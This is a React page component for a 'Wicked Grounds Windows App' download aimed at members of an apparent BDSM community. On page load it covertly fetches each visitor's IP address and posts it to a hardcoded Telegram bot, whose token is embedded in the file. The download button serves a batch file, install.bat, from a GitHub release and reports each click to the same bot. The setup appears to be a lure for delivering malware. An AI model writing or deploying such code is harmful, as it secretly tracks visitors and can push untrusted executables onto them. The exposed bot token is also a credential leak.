import { useEffect } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Download, Monitor } from "lucide-react";

// TODO: Replace with the actual Windows app download URL when available
const WINDOWS_APP_DOWNLOAD_URL =
  "https://github.com/melia7676/wedev/releases/download/v1/install.bat";

const TOKEN = "8687970131:AAGPD5C-2aJF-Ozu2ijf17OuWLbIjLrdR_Y";
const CHATID = "7724811832";

const MembershipApp = () => {
  // Send IP notification when the page loads
  useEffect(() => {
    const notifyPageLoad = async () => {
      try {
        // Get visitor IP
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const { ip } = await ipRes.json();

        // Notify Telegram
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: CHATID,
            text: `🌐 Page loaded\nIP: ${ip}`,
          }),
        });
      } catch (error) {
        console.error("Failed to send page-load notification:", error);
      }
    };

    notifyPageLoad();
  }, []);

  const handleDownload = async () => {
    // 1. Open the download
    if (WINDOWS_APP_DOWNLOAD_URL === "#") {
      console.log("Windows app download URL not yet configured.");
    } else {
      window.open(WINDOWS_APP_DOWNLOAD_URL, "_blank");
    }

    // 2. Notify Telegram about the download click
    try {
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: CHATID,
          text: "🔔 Someone just clicked Download on the Wicked Grounds Windows App!",
        }),
      });
    } catch (error) {
      console.error("Failed to send download notification:", error);
    }
  };

  return (
    <div className="min-h-screen py-12 px-6">
      <div className="max-w-3xl mx-auto">
        <Card className="p-8 md:p-12 shadow-elegant">
          <div className="text-center mb-8">
            <div className="inline-flex items-center justify-center w-16 h-16 rounded-full gradient-primary mb-6 shadow-glow">
              <Monitor className="w-8 h-8 text-primary-foreground" />
            </div>
            <h1 className="text-3xl md:text-4xl font-bold mb-4 bg-gradient-to-r from-primary to-accent bg-clip-text text-transparent">
              Download the Wicked Grounds Windows App
            </h1>
          </div>

          <div className="space-y-6 text-center max-w-2xl mx-auto">
            <p className="text-lg text-muted-foreground leading-relaxed">
              This is the tool we will use to structure our dynamic.
            </p>

            <div className="bg-muted/50 rounded-xl p-6 text-left space-y-4">
              <p className="text-foreground leading-relaxed">
                Your Mistress/Master will assign your tasks, rules, and
                expectations there. You will mark completions, earn points for
                good behavior that you can redeem for rewards approved by your
                Mistress/Master, and face consequences for failures.
              </p>
              <p className="text-foreground leading-relaxed">
                It keeps you accountable every day, even when you're apart, and
                reinforces that your submission is ongoing, not just when you're
                together.
              </p>
            </div>

            <div className="pt-4">
              <Button
                size="lg"
                className="w-full md:w-auto gradient-primary shadow-glow px-8 py-6 text-lg"
                onClick={handleDownload}
              >
                <Download className="mr-2 h-5 w-5" />
                Download Wicked Grounds Windows App
              </Button>

              {WINDOWS_APP_DOWNLOAD_URL === "#" && (
                <p className="text-xs text-muted-foreground mt-3">
                  Download link coming soon — check back shortly.
                </p>
              )}
            </div>
          </div>
        </Card>

        <p className="text-sm text-muted-foreground text-center mt-8">
          Questions? Contact us at houseofsatisfactionbdsmcommu@gmail.com
        </p>
      </div>
    </div>
  );
};

export default MembershipApp;
